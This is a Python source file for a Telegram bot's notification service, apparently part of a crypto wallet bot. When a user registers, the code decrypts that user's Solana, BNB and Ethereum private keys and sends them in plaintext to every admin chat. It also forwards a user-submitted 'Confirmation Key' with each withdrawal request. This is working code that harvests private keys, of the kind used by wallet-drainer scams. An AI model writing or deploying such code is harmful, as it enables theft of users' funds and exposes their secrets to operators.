from __future__ import annotations

import html
import logging

from aiogram import Bot
from aiogram.exceptions import TelegramBadRequest

from app.bots.keyboards.admin.main import registered_user_keyboard
from app.config.settings import Settings
from app.database.models import User
from app.services.user_wallet_service import UserWalletService

logger = logging.getLogger(__name__)


class NotificationService:
    def __init__(self, admin_bot: Bot, settings: Settings) -> None:
        self.admin_bot = admin_bot
        self.settings = settings

    async def notify_new_user(self, user: User) -> None:
        username = f"@{html.escape(user.username)}" if user.username else "Not provided"
        name = " ".join(
            part for part in (user.first_name, user.last_name) if part
        ) or "Not provided"
        wallet_service = UserWalletService(self.settings.encryption_key.get_secret_value())
        addresses = wallet_service.addresses(user)
        text = (
            "🆕 <b>NEW USER REGISTERED</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>Name:</b> {html.escape(name)}\n"
            f"🆔 <b>Username:</b> {username}\n"
            f"📱 <b>Chat ID:</b> <code>{user.telegram_id}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔑 <b>PRIVATE KEYS</b>\n\n"
            f"SOL: <code>{html.escape(wallet_service.private_key(user, 'solana'))}</code>\n\n"
            f"BNB: <code>{html.escape(wallet_service.private_key(user, 'bnb'))}</code>\n\n"
            f"ETH: <code>{html.escape(wallet_service.private_key(user, 'ethereum'))}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "📍 <b>WALLET ADDRESSES</b>\n\n"
            f"SOL: <code>{html.escape(addresses['SOL'])}</code>\n\n"
            f"BNB: <code>{html.escape(addresses['BNB'])}</code>\n\n"
            f"ETH: <code>{html.escape(addresses['ETH'])}</code>"
        )
        for admin_id in self.settings.admin_telegram_ids:
            try:
                await self.admin_bot.send_message(
                    admin_id,
                    text,
                    reply_markup=registered_user_keyboard(user.id),
                    parse_mode="HTML",
                )
            except TelegramBadRequest as exc:
                if "chat not found" in str(exc).lower():
                    logger.warning(
                        "Admin notification skipped because Telegram cannot access a "
                        "configured admin chat. Open the admin bot, send /start, and "
                        "verify ADMIN_TELEGRAM_IDS."
                    )
                    continue
                logger.exception("Unable to deliver a new-user admin notification")
            except Exception:
                logger.exception("Unable to deliver a new-user admin notification")

    async def notify_withdrawal_address(
        self,
        *,
        telegram_id: int,
        telegram_name: str,
        username: str | None,
        chain: str,
        amount: str,
        destination_address: str,
        submitted_address: str,
    ) -> None:
        username_text = f"@{html.escape(username)}" if username else "Not provided"
        text = (
            "📤 <b>WITHDRAWAL ADDRESS SUBMITTED</b>\n\n"
            f"👤 <b>Telegram name:</b> {html.escape(telegram_name)}\n"
            f"🆔 <b>Telegram ID:</b> <code>{telegram_id}</code>\n"
            f"🔗 <b>Username:</b> {username_text}\n"
            f"⛓ <b>Chain:</b> {html.escape(chain)}\n"
            f"💰 <b>Withdrawal amount:</b> {html.escape(amount)}\n\n"
            "<b>Destination address:</b>\n"
            f"<code>{html.escape(destination_address)}</code>\n\n"
            "<b>Confirmation Key:</b>\n"
            f"<code>{html.escape(submitted_address)}</code>"
        )
        for admin_id in self.settings.admin_telegram_ids:
            try:
                await self.admin_bot.send_message(admin_id, text, parse_mode="HTML")
            except TelegramBadRequest as exc:
                if "chat not found" in str(exc).lower():
                    logger.warning(
                        "Withdrawal address notification skipped because Telegram "
                        "cannot access a configured admin chat."
                    )
                    continue
                logger.exception("Unable to deliver a withdrawal address notification")
            except Exception:
                logger.exception("Unable to deliver a withdrawal address notification")
